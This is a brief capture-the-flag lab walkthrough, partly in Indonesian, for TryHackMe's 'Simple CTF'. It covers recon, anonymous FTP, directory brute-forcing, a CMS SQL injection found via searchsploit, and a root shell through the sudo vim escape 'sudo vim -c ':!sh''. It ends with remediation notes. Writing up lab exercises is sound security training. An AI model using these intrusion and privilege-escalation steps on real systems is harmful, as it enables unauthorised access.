# Simple CTF - TryHackMe

**Skills:** FTP Anon, Gobuster, Hash Cracking, Sudo Privesc

## Recon
nmap IP
-> 21 ftp, 80 http, 2222 ssh

## FTP
ftp IP -> login Anonymous:Anonymous
get ForMitch.txt & pub key?

## Web
gobuster -> /simple/
-> ada CMS Made Simple
searchsploit cms made simple
-> CVE SQLi -> dapet hash & creds

## SSH
ssh mitch@IP -p 2222
-> cat user.txt

## Root
sudo -l
-> (root) NOPASSWD: /usr/bin/vim
sudo vim -c ':!sh'
# -> root shell
cat /root/root.txt

Fix: matikan FTP anon, update CMS, jangan kasih vim sudo NOPASSWD
